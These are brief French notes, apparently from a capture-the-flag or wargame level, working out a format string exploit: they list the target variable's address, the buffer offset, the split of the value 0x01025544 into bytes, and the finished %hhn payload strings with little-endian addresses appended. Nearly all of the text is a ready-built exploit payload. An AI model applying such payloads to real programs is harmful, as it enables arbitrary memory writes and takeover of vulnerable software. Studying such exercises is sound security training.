adresse de m: 0x08049810

adresse du buffer: 0xb7fd1ac0

index de l'argument qui debute au buffer: 9

il faut que m ait la valeur 0x01025544.
Cette valeur est trop grande pour l'ecrire directement a l'aide du printf dans le buffer.
Il faudra donc la diviser en plusieurs morceaux:
0x01 = 1
0x02 = 2
0x44 = 68
0x55 = 85

chaine a ecrire:
a%??$hhn
b%??$hhn
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1%??$hhn
Aa0Aa1Aa2Aa3Aa4Aa%??$hhn
abc
\x13\x98\x04\x08
\x12\x98\x04\x08
\x11\x98\x04\x08
\x10\x98\x04\x08

85 + 4 * (1 + 2 + 1 + 3) = 113 -> 29 * 4 = 116
arg1 = 29 + 9 = 38
arg1 = 41

ahh%%41\$xbhh%%42\$xAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1hh%%44\$xAa0Aa1Aa2Aa3Aa4Aahh%%43\$xabc\x13\x98\x04\x08\x12\x98\x04\x08\x11\x98\x04\x08\x10\x98\x04\x08

a%%41\$hhnb%%42\$hhnAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1%%44\$hhnAa0Aa1Aa2Aa3Aa4Aa%%43\$hhnabc\x13\x98\x04\x08\x12\x98\x04\x08\x11\x98\x04\x08\x10\x98\x04\x08
